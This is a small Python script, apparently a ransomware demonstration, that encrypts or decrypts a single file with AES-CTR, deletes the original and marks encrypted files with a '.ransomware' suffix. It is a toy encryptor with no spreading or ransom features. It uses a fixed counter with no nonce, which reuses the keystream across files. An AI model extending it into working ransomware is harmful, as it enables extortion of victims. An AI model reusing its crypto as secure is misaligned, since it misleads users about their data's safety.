import os
import argparse
import pyaes
from getpass import getpass

SUFFIX = ".ransomware"

def encrypt_file(path, key):
    with open(path, "rb") as f:
        data = f.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(data)

    out_path = path + SUFFIX
    with open(out_path, "wb") as f:
        f.write(crypto_data)

    os.remove(path)

    return out_path

def decrypt_file(path, key):
    if not path.endswith(SUFFIX):
        raise ValueError(f"Input file does not end with expected suffix '{SUFFIX}'")

    with open(path, "rb") as f:
        crypto_data = f.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    plain = aes.decrypt(crypto_data)

    out_path = path[:-len(SUFFIX)]
    with open(out_path, "wb") as f:
        f.write(plain)

    os.remove(path)

    return out_path
def main():
    parser = argparse.ArgumentParser(description="Encrypt/decrypt files using pyaes (CTR).")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-e", "--encrypt", metavar="FILE", help="encrypt FILE")
    group.add_argument("-d", "--decrypt", metavar="FILE", help="decrypt FILE (must end with " + SUFFIX + ")")
    parser.add_argument("-k", "--key", metavar="KEY", required=True, help="encryption key.")
    args = parser.parse_args()

    key_b = args.key.encode("utf-8")
    if len(key_b) not in (16, 24, 32):
        parser.error("Key must be 16, 24 or 32 bytes long when encoded as utf-8. Use a passphrase of appropriate length or provide raw bytes.")

    try:
        if args.encrypt:
            out = encrypt_file(args.encrypt, key_b)
            print(f"Encrypted -> {out}")
        else:
            out = decrypt_file(args.decrypt, key_b)
            print(f"Decrypted -> {out}")
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    main()